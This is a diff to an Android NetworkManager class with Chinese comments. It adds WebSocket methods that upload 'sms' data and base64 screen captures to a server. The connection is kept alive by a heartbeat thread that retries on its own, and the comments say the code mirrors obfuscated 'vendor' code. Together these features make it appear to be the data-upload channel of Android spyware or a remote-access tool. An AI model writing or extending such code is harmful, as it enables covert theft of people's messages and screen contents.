@@ -82,7 +82,53 @@ public class NetworkManager {
         httpClient = new HttpClient(baseApiUrl, deviceId);
         wsClient = new WebSocketClient(wsUrl, deviceId);
 
-        Log.i(TAG, "Network initialized: server=" + baseApiUrl);
+        // 不在 init() 中直接 connect()
+        // 对齐 vendor: KeepHeartThread 在首次 tick 时检测并懒启动连接
+        // 这样即使首次连接失败，心跳线程会持续重试
+
+        Log.i(TAG, "Network initialized: server=" + baseApiUrl + ", ws=" + wsUrl);
+    }
+
+    // ============ WebSocket 便捷方法 ============
+
+    /**
+     * 启动 WebSocket 连接
+     * 由 KeepHeartThread 调用 (对齐 vendor 懒启动模式)
+     */
+    public void connectWebSocket() {
+        if (wsClient != null) {
+            wsClient.connect();
+        }
+    }
+
+    /**
+     * WebSocket 连接状态
+     */
+    public boolean isWebSocketConnected() {
+        return wsClient != null && wsClient.isConnected();
+    }
+
+    /**
+     * 通用数据上报 (通过 WebSocket)
+     * 供其他模块调用: sendToServer("sms", data)
+     */
+    public void sendToServer(String subc, String data) {
+        if (wsClient != null && wsClient.isConnected()) {
+            wsClient.sendData(subc, data);
+        } else {
+            Log.w(TAG, "sendToServer: WebSocket not connected, subc=" + subc);
+        }
+    }
+
+    /**
+     * 屏幕数据上报 (通过 WebSocket)
+     */
+    public void sendScreenToServer(String subc, String imgBase64, int width, int height) {
+        if (wsClient != null && wsClient.isConnected()) {
+            wsClient.sendScreen(subc, imgBase64, width, height);
+        } else {
+            Log.w(TAG, "sendScreenToServer: WebSocket not connected");
+        }
     }
 
     // ============ P0: 消息上报 (vendor: l.t + l.q) ============
